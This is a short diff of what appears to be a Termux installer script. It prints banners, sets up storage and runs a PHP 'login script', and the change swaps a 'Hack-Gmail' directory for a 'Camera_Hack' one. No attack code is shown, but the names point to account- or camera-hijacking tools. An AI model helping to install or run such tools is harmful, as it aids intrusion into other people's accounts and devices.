@@ -23,7 +23,7 @@ apt install figlet -y
 echo -e "\033[31m\033[1m        INSTALLATION COMPLETED \033[32m[\033[36m✓\033[32m]" | pv -qL 12
 echo -e "\033[33m\033[1m]────────────────────────────────────────────["
 termux-setup-storage
-cd $HOME/Hack-Gmail.
+cd $HOME/Camera_Hack
 
 # Run login script
 php termux.php
